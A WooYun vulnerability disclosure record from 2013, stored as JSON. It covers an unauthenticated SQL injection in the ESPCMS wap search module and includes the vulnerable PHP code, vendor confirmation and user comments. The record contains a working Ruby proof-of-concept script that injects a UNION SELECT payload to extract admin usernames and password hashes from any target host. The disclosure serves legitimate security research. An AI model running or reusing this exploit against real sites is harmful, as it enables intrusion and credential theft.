{"id": 9453, "wybug_id": "wooyun-2013-026820", "wybug_title": "Espcms wap模块SQL注入", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "猪头子", "wybug_date": "2013-06-25 10:28", "wybug_open_date": "2013-09-23 10:29", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-08-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-23：\t细节向公众公开  简要描述： 无需认证，直接爆数据 详细说明：  变量的传递过程是$_SERVER['QUERY_STRING']->$urlcode->$output->$value->$db_where->$sql->mysql_query，整个过程无过滤导致了注入的发生。正因为变量是从$_SERVER['QUERY_STRING']中去取的，所以正好避开了程序的过滤。而注入的变量是数组的值，并非数组的key，所以也没过被过滤，综合起来形成了一个比较少见的SQL注入。在/interface/3gwap_search.php文件的in_result函数中:\nfunction in_result() {            ... ... ... ... ... ... ... ... ...            //从$_SERVER['QUERY_STRING']中获取数据            $urlcode = $_SERVER[ 'QUERY_STRING '];            parse_str(html_entity_decode($urlcode), $output);            ... ... ... ... ... ... ... ... ...            if (is_array($output['attr' ]) && count($output['attr']) > 0) {                  $db_table = db_prefix . 'model_att';                   foreach ($output['attr' ] as $key => $value) {                         if ($value) {                              //对key过滤，忽略了value                              $key = addslashes($key);                              $key = $this-> fun->inputcodetrim($key);                              $db_att_where = \" WHERE isclass=1 AND attrname='$key'\";                              //要求此处$countnum>0                              $countnum = $this->db_numrows($db_table, $db_att_where);                               if ($countnum > 0) {                                    //value被拼接进入SQL语句                                    $db_where .= ' AND b.' . $key . '=\\'' . $value . '\\'' ;                              }                        }                  }            }            if (!empty ($keyword) && empty($keyname)) {                  $keyname = 'title';                  $db_where.= \" AND a.title like '%$keyword%'\" ;            } elseif (!empty ($keyword) && !empty($keyname)) {                  $db_where.= \" AND $keyname like '% $keyword%'\";            }            $pagemax = 15;            $pagesylte = 1;             if ($countnum > 0) {                  $numpage = ceil($countnum / $pagemax);            } else {                  $numpage = 1;            }            //拼接进入SQL语句            $sql = \"SELECT b.*,a.* FROM \" . db_prefix . \"document AS a LEFT JOIN \" . db_prefix . \"document_attr AS b ON a.did=b.did \" . $db_where . ' LIMIT 0,' . $pagemax;            $this-> htmlpage = new PageBotton($sql, $pagemax, $page, $countnum, $numpage, $pagesylte, $this->CON ['file_fileex' ], 5, $this->lng['pagebotton' ], $this->lng['gopageurl'], 0);            $sql = $this-> htmlpage->PageSQL('a.did' , 'down' );            //被执行            $rs = $this->db->query($sql);            ... ... ... ... ... ... ... ... ...      }\n因此若传入数组且key经过构造的话，可以达到SQL注入的目的   漏洞证明：  \n\nPoC：\nrequire \"net/http\"require \"uri\"def request(method, url)\tif method.eql?(\"get\")\t\turi = URI.parse(url)\t\thttp = Net::HTTP.new(uri.host, uri.port)\t\tresponse = http.request(Net::HTTP::Get.new(uri.request_uri))\t\treturn response\tendenddoc =<<HERE-------------------------------------------------------Espcms Inejction ExploitAuthor:ztzBlog:http://ztz.fuzzexp.org/-------------------------------------------------------HEREusage =<<HEREUsage: \t\truby #{$0} host port pathexample: \truby #{$0} www.target.com 80 /HEREputs docif ARGV.length < 3\tputs usageelse\t$host = ARGV[0]\t$port = ARGV[1]\t$path = ARGV[2]\tputs \"[*]send request...\"\turl = \"http://#{$host}:#{$port}#{$path}wap/index.php?ac=search&at=result&lng=cn&mid=3&tid=11&keyword=1&keyname=a.title&countnum=1&attr[jobnum]=1%27%20and%201=2%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,concat%28username,CHAR%2838%29,password%29,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45%20from%20espcms_admin_member;%23\"\tresponse = request(\"get\", url)\tresult = response.body.scan(/\\w+&\\w{32}/)\tputs resultend\n\n\n   修复方案：  过滤value   版权声明：转载请注明来源 猪头子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-06-25 18:13 厂商回复： 感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-25 17:31 |    \t\t唐尸三摆手 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:9        | 摆手啊摆手啊摆手！！)\t\t \n  2000?    \n     2013-08-07 23:04 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  @唐尸三摆手 是的    \n     2013-09-23 10:40 |    \t\tEvi1m0 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 邪红色信息安全组织)\t\t \n  @猪头子 ZTZ    \n     2013-09-23 11:15 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  @Evi1m0 快去写poc    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}